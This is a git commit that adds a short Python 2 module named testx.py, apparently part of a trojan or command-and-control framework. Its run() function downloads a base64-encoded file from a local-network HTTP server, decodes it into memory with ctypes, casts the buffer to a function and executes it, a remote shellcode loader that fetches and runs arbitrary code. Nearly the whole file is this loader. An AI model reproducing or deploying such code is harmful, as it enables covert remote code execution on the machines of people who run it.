f05efc0ea6fe7c38c8b2d48d655dfc0864033030
experiment2016 <sarpiericam@libero.it>
2016-05-30 18:56:22 +0200

    Update and rename test2.py to testx.py

---
+++ modules/testx.py
@@ -0,0 +1,17 @@
+import urllib2
+import ctypes
+import base64
+def run(**args):
+  try:
+     url = "http://192.168.1.2:8000/file.bin"
+     response = urllib2.urlopen(url)
+     file = base64.b64decode(response.read())
+     file_buffer = ctypes.create_string_buffer(file, len(file))
+     file_func = ctypes.cast(file_buffer, ctypes.CFUNCTYPE
+     (ctypes.c_void_p))
+     file_func()
+  except Exception, e:
+      return str(e)
+
+
+
